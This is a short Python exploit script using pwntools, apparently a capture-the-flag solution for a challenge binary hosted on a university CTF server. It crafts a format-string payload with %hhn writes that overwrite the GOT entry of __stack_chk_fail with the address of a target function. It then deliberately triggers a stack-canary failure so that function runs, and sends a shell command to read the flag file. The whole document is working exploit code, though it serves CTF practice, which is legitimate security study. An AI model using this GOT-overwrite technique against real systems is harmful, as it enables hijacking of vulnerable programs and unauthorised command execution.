#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
from pwn import *

context.log_level = 'debug'

fn = './binary_200'

# 一个奇妙的想法，在__stack_chk_fail的got表中写入canary_protect_me的地址
# elf.got['__stack_chk_fail'] <- elf.symbols['canary_protect_me']
# 原地址 got:0x0804a014(plt:0x08048406 <- plt:0x0804854d)

elf = ELF(fn)

stack_check_fail_got = elf.got['__stack_chk_fail']
canary_protect_me_plt = elf.symbols['canary_protect_me']

log.info('stack_check_fail_got = %s', hex(stack_check_fail_got))
log.info('canary_protect_me_plt = %s', hex(canary_protect_me_plt))

byte0 = canary_protect_me_plt & 0xff
byte1 = (canary_protect_me_plt >> 8) & 0xff

log.debug('byte0 = %s', hex(byte0))
log.debug('byte1 = %s', hex(byte1))

fmt = '%{b0}c%{o0}$hhn%{b1_b0}c%{o1}$hhn'.format(
    o0=(5 + 28 // 4), 
    o1=(5 + 28 // 4 + 1), 
    b0=byte0, 
    b1_b0=(byte1 - byte0)
)
log.debug('fmt = %s', fmt)
log.debug('len(fmt) = %s', len(fmt))


if len(sys.argv) == 1:
    io = process(fn)
else:
    io = remote('bamboofox.cs.nctu.edu.tw', 22002)

payload = ''.join([
    fmt.ljust(28, '#'),
    p32(stack_check_fail_got),
    p32(stack_check_fail_got + 1),
])

io.sendline(payload)

io.recv(1024, timeout=1)

io.sendline('$' * 50)

sleep(1)

io.sendline('cat /home/ctf/flag')
flag = io.recv(1024, timeout=1)
io.close()
log.success(flag)

# io.interactive()
